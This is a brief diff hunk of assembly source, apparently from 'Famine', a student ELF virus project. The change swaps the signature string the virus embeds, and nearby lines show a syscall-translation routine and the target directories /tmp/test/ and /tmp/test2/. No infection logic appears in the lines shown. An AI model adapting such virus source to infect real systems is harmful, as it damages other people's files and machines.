@@ -389,7 +389,7 @@ _translate_syscall:                                             ; expecting r15 
                 ret
 
 slash_tmp       db          "/tmp/test/",0,"/tmp/test2/",0,0
-signature       db          "famine! hybrid @42siliconvalley",0
+signature       db          "Famine version 1.0 (c)oded by asarandi",0
 
 _platform:
 %ifidn __OUTPUT_FORMAT__, elf64
